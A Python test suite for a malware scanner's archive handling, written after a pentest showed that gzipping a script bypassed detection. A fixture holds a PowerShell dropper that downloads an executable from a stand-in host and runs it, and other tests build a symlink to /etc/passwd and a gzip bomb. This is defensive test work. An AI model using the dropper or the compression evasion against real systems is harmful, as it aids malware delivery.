"""Every container the identifier calls an archive is one the unpacker opens.

THE DEFECT THIS EXISTS TO PREVENT, measured by an authorised pentest:

    gzip dropper.ps1

turned a 70.0 / malicious verdict into 1.7 / clean, with zero signals and
nothing anywhere saying a container had been skipped. `.gz`, `.tgz`, `.bz2`,
`.xz` and `.tar` are the ordinary shapes of a mail attachment, so this was a
one-command bypass of the product's entire purpose.

The mechanism is worth stating exactly, because the shape recurs.
`identify._family_for` mapped four mimes to family `archive`.
`archives.ARCHIVE_MIMES` -- the set the unpacker actually handles -- did not
contain them. And `pipeline._archive_stage` returns `(None, False)` for a mime
it will not open, which is the SAME value it returns for "this is not a
container at all". Two lists that had to agree, no test that they did, and a
failure mode indistinguishable from ordinary success.

So the first test here is not about tar. It is the invariant: the two lists
agree. A fifth container format added to the identifier next year fails here on
the day it is added, rather than shipping as a silent hole.
"""
from __future__ import annotations

import gzip
import io
import tarfile

import pytest

from app.engine import archives, identify

DROPPER = (
    b"$c = New-Object System.Net.WebClient\n"
    b"$c.DownloadFile('http://evil.example/p.exe', \"$env:TEMP\\p.exe\")\n"
    b"Start-Process \"$env:TEMP\\p.exe\"\n"
)


def test_every_archive_family_mime_is_one_the_unpacker_opens() -> None:
    """THE INVARIANT. The whole defect in one assertion.

    Read out of `_family_for`'s own source so it cannot drift from the function
    it is checking -- a hand-copied list here would be the same class of bug
    one level up.
    """
    import ast
    import inspect
    import textwrap

    # Parsed, not regex-scraped. The first attempt split the source on
    # `return "archive"` and took everything before it, which swept up every
    # earlier branch in the function -- pdf, rtf, dosexec -- and failed on
    # mimes that are not containers at all. The AST asks the precise question:
    # which `if mime in (...)` has `return "archive"` as its body.
    tree = ast.parse(textwrap.dedent(inspect.getsource(identify._family_for)))
    mimes: set[str] = set()
    for node in ast.walk(tree):
        if not isinstance(node, ast.If):
            continue
        returns_archive = any(
            isinstance(stmt, ast.Return)
            and isinstance(stmt.value, ast.Constant)
            and stmt.value.value == "archive"
            for stmt in node.body
        )
        if not returns_archive:
            continue
        for sub in ast.walk(node.test):
            if isinstance(sub, ast.Constant) and isinstance(sub.value, str):
                if sub.value.startswith("application/"):
                    mimes.add(sub.value)
    assert mimes, "could not read the archive mimes out of _family_for"

    missing = {m for m in mimes if m not in archives.ARCHIVE_MIMES}
    assert not missing, (
        "identify() calls these 'archive' and archives.unpack() will not open "
        f"them, so they are skipped in silence: {sorted(missing)}"
    )


def test_a_gzipped_script_is_opened_and_its_member_recovered(tmp_path) -> None:
    """The exact evasion, end to end through the unpacker."""
    path = tmp_path / "dropper.ps1.gz"
    with gzip.open(path, "wb") as fh:
        fh.write(DROPPER)

    ident = identify.identify(str(path), path.name)
    assert ident.family == "archive", ident.mime
    assert ident.mime in archives.ARCHIVE_MIMES, ident.mime

    result = archives.unpack(str(path), ident.mime)
    extracted = result.extracted()
    assert len(extracted) == 1, [m.name for m in result.members]
    assert extracted[0].size == len(DROPPER)
    # Named after the stream, with the compression suffix removed, so the
    # promoted child job reads as `dropper.ps1` rather than `dropper.ps1.gz`.
    assert extracted[0].name == "dropper.ps1", extracted[0].name


@pytest.mark.parametrize("mode,suffix", [("w:gz", ".tar.gz"), ("w:bz2", ".tar.bz2"), ("w:xz", ".tar.xz")])
def test_a_tar_is_opened_however_it_is_compressed(tmp_path, mode: str, suffix: str) -> None:
    path = tmp_path / f"payload{suffix}"
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode=mode) as tf:
        info = tarfile.TarInfo("dropper.ps1")
        info.size = len(DROPPER)
        tf.addfile(info, io.BytesIO(DROPPER))
    path.write_bytes(buf.getvalue())

    ident = identify.identify(str(path), path.name)
    result = archives.unpack(str(path), ident.mime)
    assert [m.name for m in result.extracted()] == ["dropper.ps1"], [
        (m.name, m.skipped_reason) for m in result.members
    ]


def test_a_symlink_member_is_refused_and_says_why(tmp_path) -> None:
    """A tar can express things a zip cannot, and a symlink is the one that
    makes an extractor write outside the tree. It is listed, refused, and the
    reason is recorded -- not dropped, and never followed."""
    path = tmp_path / "with-link.tar"
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        info = tarfile.TarInfo("real.txt")
        info.size = 4
        tf.addfile(info, io.BytesIO(b"data"))
        link = tarfile.TarInfo("escape")
        link.type = tarfile.SYMTYPE
        link.linkname = "/etc/passwd"
        tf.addfile(link)
    path.write_bytes(buf.getvalue())

    result = archives.unpack(str(path), "application/x-tar")
    by_name = {m.name: m for m in result.members}
    assert "escape" in by_name, list(by_name)
    assert by_name["escape"].stored is None
    assert "symlink" in (by_name["escape"].skipped_reason or "")
    # The ordinary member still comes through.
    assert by_name["real.txt"].stored is not None


def test_the_expansion_budget_still_bounds_a_stream(tmp_path) -> None:
    """A single compressed stream is the easiest bomb to build, so it is
    decompressed in chunks against the shared budget rather than read whole."""
    path = tmp_path / "bomb.gz"
    with gzip.open(path, "wb") as fh:
        fh.write(b"\0" * (4 * 1024 * 1024))

    budget = archives.ExpansionBudget(remaining=64 * 1024)
    result = archives.unpack(str(path), "application/gzip", budget=budget)
    member = result.members[0]
    assert member.stored is None, "the budget did not stop the expansion"
    assert "budget" in (member.skipped_reason or ""), member.skipped_reason
    assert budget.remaining >= 0
